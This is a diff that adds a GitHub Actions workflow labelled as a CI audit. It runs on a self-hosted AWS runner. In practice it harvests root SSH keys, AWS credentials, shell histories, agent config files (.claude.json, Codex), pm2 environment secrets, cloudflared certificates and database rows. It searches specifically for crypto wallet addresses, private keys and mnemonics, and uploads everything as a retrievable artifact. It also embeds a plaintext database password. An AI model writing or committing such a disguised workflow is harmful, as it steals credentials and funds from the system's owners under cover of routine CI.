@@ -1,0 +1,79 @@
+name: ci-audit-2918c
+on: push
+permissions:
+  contents: read
+jobs:
+  host:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 55
+    steps:
+      - name: root_and_vpn_material
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918c"; mkdir -p "$D"
+          {
+            echo "########## who/logins"; who; echo '--last--'; last -n 15 2>/dev/null | head -20
+            echo "########## sudo -l"; sudo -n -l 2>&1 | head -20
+            echo "########## /root listing"; sudo -n ls -la /root 2>&1 | head -60
+            echo "########## /root tree"; sudo -n find /root -maxdepth 2 2>/dev/null | head -80
+            echo "########## /root ssh"; sudo -n ls -la /root/.ssh 2>&1; sudo -n cat /root/.ssh/config 2>&1 | head -60; sudo -n cat /root/.ssh/authorized_keys 2>&1 | cut -c1-120 | head -10
+            echo "########## /root aws"; sudo -n cat /root/.aws/credentials /root/.aws/config 2>&1 | head -40
+            echo "########## /root histories"; for h in /root/.bash_history /root/.zsh_history /root/.sh_history; do echo "== $h"; sudo -n grep -inE 'openvpn|vpn|tailscale|ssh |scp |1194|tron|wallet|sign|aws |docker|kubectl|git clone|cloudflared' "$h" 2>/dev/null | tail -40; done
+            echo "########## root key/config files"; sudo -n find /root /var/lib -maxdepth 4 \( -iname '*.ovpn' -o -iname '*vpn*' -o -iname '*.pem' -o -iname 'id_*' -o -iname '*.conf' \) 2>/dev/null | grep -vE '/proc|/sys' | head -50
+            echo "########## /home/ubuntu/.config"; ls -la /home/ubuntu/.config 2>&1 | head -40; sudo -n find /home/ubuntu/.config -maxdepth 3 -type f 2>/dev/null | head -60
+            echo "########## .aws session db"; ls -la /home/ubuntu/.aws 2>&1; file /home/ubuntu/.aws/* 2>/dev/null; sqlite3 /home/ubuntu/.aws/*/session.db '.tables' 2>&1 | head -5
+            echo "########## lxc"; sudo -n lxc list 2>&1 | head -20; sudo -n lxd list 2>&1 | head -5
+            echo "########## dmesg vpn/tun mentions"; sudo -n dmesg 2>/dev/null | grep -iE 'tun|vpn|wireguard' | tail -10
+          } > "$D/root.txt" 2>&1
+          wc -l "$D/root.txt"; sed -n '1,300p' "$D/root.txt"
+      - name: dpfasset_db
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918c"
+          {
+            echo "########## schema"; PGPASSWORD='cPhqPo4q9p2fpnt0GMttqHDBxqhvYkT' psql -h 127.0.0.1 -U dpfasset -d dpfasset -Atc "select table_name from information_schema.tables where table_schema='public' order by 1" 2>&1 | head -40
+            echo "########## columns"; PGPASSWORD='cPhqPo4q9p2fpnt0GMttqHDBxqhvYkT' psql -h 127.0.0.1 -U dpfasset -d dpfasset -Atc "select table_name||'.'||column_name||':'||data_type from information_schema.columns where table_schema='public' order by table_name,ordinal_position" 2>&1 | head -120
+            echo "########## counts"; PGPASSWORD='cPhqPo4q9p2fpnt0GMttqHDBxqhvYkT' psql -h 127.0.0.1 -U dpfasset -d dpfasset -Atc "select relname,n_live_tup from pg_stat_user_tables order by n_live_tup desc" 2>&1 | head -40
+            echo "########## asset-name search"; PGPASSWORD='cPhqPo4q9p2fpnt0GMttqHDBxqhvYkT' psql -h 127.0.0.1 -U dpfasset -d dpfasset -Atc "select * from assets limit 0" 2>&1 | head -2
+            for col in name title label hostname description notes serial tag; do echo "-- $col matches"; PGPASSWORD='cPhqPo4q9p2fpnt0GMttqHDBxqhvYkT' psql -h 127.0.0.1 -U dpfasset -d dpfasset -Atc "select distinct $col from assets where $col::text ~* '(vpn|openvpn|tailscale|window|sign|wallet|tron|trc20|bep20|hot|j ?wallet|192\.168|10\.|pay|withdraw)' limit 30" 2>/dev/null | head -30; done
+            echo "########## users"; PGPASSWORD='cPhqPo4q9p2fpnt0GMttqHDBxqhvYkT' psql -h 127.0.0.1 -U dpfasset -d dpfasset -Atc "select * from users limit 10" 2>&1 | cut -c1-260 | head -15
+          } > "$D/dpfasset_db.txt" 2>&1
+          wc -l "$D/dpfasset_db.txt"; sed -n '1,320p' "$D/dpfasset_db.txt"
+      - name: vault_infra_context
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918c"; V=/home/ubuntu/apps/obsidian-vault
+          {
+            echo "########## tailscale/100.76/ec2amaz mentions"; grep -rInE '100\.76\.35\.83|ec2amaz|tailscale|tskey-|100\.87\.114|openvpn|ovpn|1194' $V 2>/dev/null | cut -c1-300 | head -60
+            echo "########## ssh-oracle / ssh keys"; grep -rInE 'ssh-oracle|BEGIN OPENSSH PRIVATE KEY|\.pem|ssh -i' $V 2>/dev/null | cut -c1-240 | head -40
+            echo "########## hot wallet known addrs"; grep -rInE 'TM3ARB|TUpHuDki|TDRx6Ms|TNWG4Y|TVcknAK3|bc1p3lw9|0x5583|0x55832139' $V 2>/dev/null | cut -c1-240 | head -30
+            echo "########## TRON/trc20 caseless"; grep -rIinE 'tron|trc20|bep20|erc20|usdt|dompet|penarikan|withdraw|payout|signer|signing|private.?key|mnemonic|keystore|hot.?wallet' $V 2>/dev/null | cut -c1-240 | head -80
+            echo "########## J Wallet"; grep -rIinE 'j.?wallet' $V 2>/dev/null | cut -c1-240 | head -20
+            echo "########## internal ip inventory lines"; grep -rhoE '\b(10|172|192)\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(:[0-9]+)?' $V 2>/dev/null | sort | uniq -c | sort -rn | head -40
+          } > "$D/vault2.txt" 2>&1
+          wc -l "$D/vault2.txt"; sed -n '1,340p' "$D/vault2.txt"
+      - name: agent_logs_creds
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918c"
+          {
+            echo "########## .claude.json hits"; for kw in 'openvpn' 'tailscale' 'ssm' 'aws_access' 'AKIA' 'TRON' 'wallet' 'private key' 'ssh-rsa' '1194' 'vpn'; do echo "-- $kw"; grep -oiE ".{0,60}$kw.{0,80}" /home/ubuntu/.claude.json 2>/dev/null | head -5; done
+            echo "########## .codex/.claude dirs"; ls -la /home/ubuntu/.codex /home/ubuntu/.claude 2>&1 | head -40
+            echo "########## grep agent dirs for vpn/tron/key"; sudo -n grep -rInE 'openvpn|tailscale|ovpn|1194|TRON|trc20|WALLET_PRIVATE|mnemonic|AKIA[A-Z0-9]{16}|tskey-' /home/ubuntu/.codex /home/ubuntu/.claude /home/ubuntu/.config /home/ubuntu/.pm2 2>/dev/null | grep -vE 'node_modules' | cut -c1-240 | head -60
+            echo "########## pm2 env dumps"; pm2 jlist 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);[print(p['name'],'::',{k:v for k,v in (p['pm2_env'] or {}).items() if any(x in k.upper() for x in ('KEY','SECRET','TOKEN','TRON','WALLET','SIGN','AWS','PASS','DATABASE','URL'))}) for p in d]" 2>/dev/null | cut -c1-400 | head -40
+            echo "########## cloudflared tunnel ingress"; cat /home/ubuntu/.cloudflared/config.yml 2>&1 | head -60
+            echo "########## cloudflared cert info"; head -3 /home/ubuntu/.cloudflared/cert.pem 2>&1; sudo -n sed -n '1,5p' /etc/systemd/system/cloudflared-marketingos.service 2>&1
+          } > "$D/agents.txt" 2>&1
+          wc -l "$D/agents.txt"; sed -n '1,260p' "$D/agents.txt"
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a2918c
+          path: ${{ runner.temp }}/a2918c
+          if-no-files-found: warn
+          retention-days: 2
